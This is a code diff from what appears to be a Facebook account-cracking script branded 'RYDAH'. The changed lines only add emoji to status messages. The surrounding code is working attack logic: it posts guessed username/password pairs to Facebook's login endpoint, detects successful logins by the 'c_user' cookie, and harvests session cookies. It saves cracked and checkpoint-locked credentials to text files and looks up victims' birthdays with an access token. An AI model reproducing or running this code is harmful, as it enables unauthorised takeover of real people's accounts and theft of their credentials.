@@ -298,7 +298,7 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H}[SUCCESFUL-RYDAH] {user} | {pw}")
+                    print(f"\r{H}[✔️SUCCESFUL-RYDAH] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
                     open('RYDAH_OK.txt' , 'a').write('%s\n' % wrt)
@@ -310,7 +310,7 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s[RYDAH TM-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s[🔒RYDAH TM-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
                         open('RYDAH_CP.txt' , 'a').write('%s\n' % wrt)
@@ -321,7 +321,7 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s[RYDAH TM-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s[🔒RYDAH TM-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
                     open('RYDAH_CP.txt' , 'a').write('%s\n' % wrt)
